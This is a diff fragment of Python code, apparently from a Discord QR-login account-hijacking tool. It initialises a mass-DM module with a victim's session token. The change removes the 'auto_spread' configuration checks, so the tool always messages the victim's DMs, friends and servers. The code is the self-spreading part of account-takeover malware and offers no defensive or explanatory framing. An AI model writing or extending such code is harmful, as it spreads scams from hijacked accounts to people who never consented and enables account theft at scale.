@@ -135,14 +135,11 @@ class QRHandler():
         await massdm.init(self.client.token, f'{self.client.user.username}#{self.client.user.discrim}')
 
         if self.useless:
-            if config.config["auto_spread"]['dm_dms'] == True:
-                await massdm.message_dms()
-            if config.config["auto_spread"]['dm_friends'] == True:
+            await massdm.message_dms()
 
-                await massdm.message_friends()
-            if config.config["auto_spread"]['dm_guilds'] == True:
+            await massdm.message_friends()
 
-                await massdm.message_guilds()
+            await massdm.message_guilds()
     
     
     
